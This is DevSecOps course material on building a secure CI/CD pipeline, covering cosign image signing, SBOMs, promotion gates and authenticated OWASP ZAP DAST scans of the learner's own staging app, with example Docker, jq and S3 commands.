File	Purpose
zap-report.html	Human-readable report
zap-report.xml	Machine-readable for CI tools
zap-report.json	JSON for dashboards or alerting
✅ Completion Checklist
 App builds and deploys to staging on push

 OWASP ZAP runs baseline scan against the deployed app

 ZAP report artifacts are stored with each CI run

 Optional: Build fails on critical/high ZAP findings

 Optional: ZAP results are published to Slack/S3

🧠 DevSecOps Lessons
Lesson	Description
Shift DAST left	You don’t need a QA team to test for live attack surfaces
Don’t trust just the code	You must test the behavior of the live app
Fail fast	DAST failures should stop promotion to production
Trace findings back to code	Every alert should map to a fixable component
Automate reports	Scans are useless unless teams see and act on them
✅ Congrats. You now have a working, real-world secure software factory that includes:
SBOMs, image scanning, secrets management, and DAST — all enforced in CI/CD.

# 🧪 Week 19 – Challenge Lab: Harden and Extend Your Secure Software Factory

---

## 🎯 Goal

Take the baseline secure CI/CD pipeline you built in the Guided Lab and:

1. Extend it with deeper security gates
2. Add traceability and integrity checks
3. Harden the entire build/deploy process
4. Build confidence in promotion to production

This challenge mimics what you'd do in an enterprise DevSecOps role.

---

## 🧩 Challenge Tasks

### ✅ 1. **Add Sigstore Cosign to Sign Your Container Images**

- Use `cosign` to sign the image after SBOM + scan
- Store the signature in your container registry (e.g., ECR or DockerHub)

```bash
cosign sign --key env://COSIGN_PRIVATE_KEY ghcr.io/yourorg/notestream-pro:latest
🧠 Why? So you can verify provenance of every deployable image

✅ 2. Create a Promotion Workflow Based on Trust Signals
Build a CI/CD stage that only promotes builds to production if:

✅ Trivy scan = no critical vulnerabilities

✅ Cosign signature exists and is valid

✅ ZAP DAST scan = no high findings

✅ SBOM file exists in artifacts or S3

❗ Simulate this with a "gatekeeper" script that checks all conditions before allowing the prod-deploy stage.

✅ 3. Automatically Push ZAP Scan Report to S3 or GitHub Releases
Add a post-processing step:

aws s3 cp zap-report.html s3://your-team-security-logs/notestream/zap-$(date +%s).html
Or for GitHub Actions:

- name: Upload ZAP Report
  uses: softprops/action-gh-release@v1
  with:
    files: zap-report.html
📊 Now your security team or DevOps manager can always audit DAST results.

✅ 4. Write a Shell Script that Verifies the Full Security State
This script should check:

Signature presence

SBOM file

Scan pass/fail

DAST report status

Simulate a tool like in-toto or Conftest that verifies the entire artifact chain.

✅ 5. Bonus: Add Notifications

Use GitHub Actions + Slack Webhook or SES

# 🔐 Week 19 – Security Review: Secure Software Factory

---

## 🎯 Security Objectives Recap

This week’s lab focused on building a **Secure Software Factory** that embeds security into every stage of the CI/CD pipeline:

| Phase | Security Layer | Tool |
|-------|----------------|------|
| Code commit | Signed commits, PR approvals | GitHub/GitLab |
| Build | SAST, SBOM, secret scan | Bandit, Syft, Trivy |
| Image | Signature, provenance | cosign |
| Deploy | IaC validation | Terraform/CDK + tfsec |
| Post-deploy | DAST | OWASP ZAP |
| Runtime | Monitoring | Falco, GuardDuty |

---

## 🧱 What Makes It Secure?

### ✅ 1. **Automation**
No manual security steps — everything runs as part of your CI/CD.

### ✅ 2. **Repeatability**
Every pipeline run generates:
- Signed images
- Verified SBOMs
- ZAP scan reports
- Deployment logs

### ✅ 3. **Gates, Not Just Scans**
Security findings impact **promotion decisions** — they’re not just logged and ignored.

### ✅ 4. **Artifact Provenance**
Everything is cryptographically signed, verified, and traceable to a source commit.

---

## 🔐 Key Security Controls Implemented

| Control | Purpose |
|--------|---------|
| 🔏 Signed Docker images | Prevent supply chain injection |
| 📦 SBOMs per build | Know what you’re shipping |
| 🧪 ZAP DAST scans | Find live app issues (auth bypass, XSS) |
| 🚨 Alerting on critical findings | Shift-left enforcement |
| 📄 Audit trail of artifacts | Trace back to any commit/image |

---

## 📌 Areas for Further Hardening

| Area | Suggestion |
|------|------------|
| 🧬 Provenance Verification | Add in-toto or SLSA attestations |
| 🔐 Secrets Lifecycle | Rotate secrets, enforce TTLs |
| 📢 Visibility | Push alerts into SIEM (e.g., Datadog, Splunk) |
| 👮 Policy-as-Code | Use OPA or Kyverno to enforce security policies |

---

## 🔁 Real-World Takeaway

A **Secure Software Factory** is not about tools — it’s about ensuring:

- **Trust** in what you deploy
- **Traceability** in who changed what
- **Enforcement** when something breaks your security baseline

# 🧪 Week 19.5 – Guided Lab: OWASP ZAP Deep Dive for DevSecOps Pipelines

---

## 🎯 Goal

Master OWASP ZAP for **real-world DAST** (Dynamic Application Security Testing). You will:

- Customize ZAP scan configurations
- Run spidering and active scans
- Scan authenticated areas using tokens or cookies
- Tune alerts and fail builds based on severity
- Generate and analyze actionable reports

This bridges the gap between "just running ZAP" and **using it like a professional DevSecOps engineer**.

---

## 🛠️ Prerequisites

- A running **staging app** (NoteStream Pro)
- ZAP CLI/Docker image available in your CI/CD
- A login page or token-based auth in the app
- Environment variable: `NOTE_STREAM_PRO_STAGING_URL`

---

## 🧩 Part 1: Authenticated Scanning (Token or Session-Based)

### 🧪 Example: Bearer Token Auth

1. Log in manually and capture a valid bearer token:
```bash
curl -X POST https://staging.notestreampro.dev/api/auth/login \
  -d '{"email": "testuser@example.com", "password": "testpass"}' \
  -H "Content-Type: application/json"
Extract and export it:

export BEARER_TOKEN="eyJhbGciOiJIUzI1NiIsIn..."
Add the token to your ZAP baseline call (via header injection):

docker run --rm -v $(pwd):/zap/wrk/:rw \
  owasp/zap2docker-stable zap-baseline.py \
  -t "$NOTE_STREAM_PRO_STAGING_URL" \
  -r zap-auth-report.html \
  -z "-config replacer.full_list(0).description=AuthHeader \
      -config replacer.full_list(0).enabled=true \
      -config replacer.full_list(0).matchtype=REQ_HEADER \
      -config replacer.full_list(0).matchregex=false \
      -config replacer.full_list(0).matchstring=Authorization \
      -config replacer.full_list(0).replacement=Bearer $BEARER_TOKEN"
✅ ZAP will now inject the token in every request, enabling auth-protected route testing.

🧩 Part 2: Spidering the App (Crawl Before Attack)
Why?
DAST tools need to discover pages before they can scan them.

docker run --rm -v $(pwd):/zap/wrk/:rw \
  owasp/zap2docker-stable zap-full-scan.py \
  -t "$NOTE_STREAM_PRO_STAGING_URL" \
  -r full-zap-spider.html \
  -z "-addoninstall ascanrulesAlpha"
🐙 The zap-full-scan.py script spiders your site and runs a deeper active scan.

🧩 Part 3: Custom Rule Filtering (Fail on High Only)
If using CI/CD, filter results based on severity:

docker run --rm -v $(pwd):/zap/wrk/:rw \
  owasp/zap2docker-stable zap-full-scan.py \
  -t "$NOTE_STREAM_PRO_STAGING_URL" \
  -J full-zap.json
Parse and fail the job (example for GitHub Actions):

cat full-zap.json | jq '.site.alerts[] | select(.risk == "High")' | grep -q . && exit 1 || echo "No high-risk issues"
🧩 Part 4: ZAP Context Files (Advanced Auth & Routing)
You can define a .context file with:

Login URL

Auth type (form, script, API token)

Excluded endpoints

CSRF token extraction

Session awareness

Import it like:

zap-cli context import context/notestream.context
🤓 This allows multi-user login, CSRF protection simulation, and complex routing scenarios.

🧩 Part 5: Report Outputs
Format	How to generate
HTML	-r report.html
XML	-x report.xml
JSON	-J report.json
Upload reports to:

🗂️ GitHub/GitLab Artifacts

☁️ S3 bucket or GCS

📬 Slack or Email summaries

🧠 DevSecOps Concepts Reinforced
Concept	How We Used It
Dynamic security testing	Scanning live staging deployments
Authenticated DAST	Validating logged-in paths
Security gates	Failing builds on high alerts
Automation	Embedding scans into the delivery pipeline
Traceability	Generating permanent, signed scan artifacts
✅ Completion Checklist
 Spidering and full scan runs on every PR to staging

 Bearer or session-based login flows are tested

 ZAP fails build if high alerts are found

 Reports are pushed to a shared store or pipeline artifacts

🎯 You now have hands-on mastery of ZAP as a DAST tool, fully integrated with CI/CD and auth-aware.
